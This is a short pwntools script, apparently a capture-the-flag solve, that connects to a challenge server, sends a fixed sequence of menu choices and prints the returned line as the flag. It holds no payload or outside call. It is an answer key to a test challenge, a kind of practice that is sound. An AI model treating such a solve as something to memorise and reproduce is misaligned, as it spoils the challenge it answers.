from pwn import *

context.log_level = 'debug'

r = remote("challenge.magpiectf.ca", 8876)

for i in range(9):
    r.recvuntil(b"Your choice: ")
    r.sendline(b"3")

r.recvuntil(b"Your choice: ")
r.sendline(b"6")
r.recvuntil(b"Which product you you like to see the review for? ")
r.sendline(b"1")
r.recvuntil(b"7. DigtLock (pure numerical digital lock)\n\n")

recv = r.recvline()
print(f"flag: {recv}")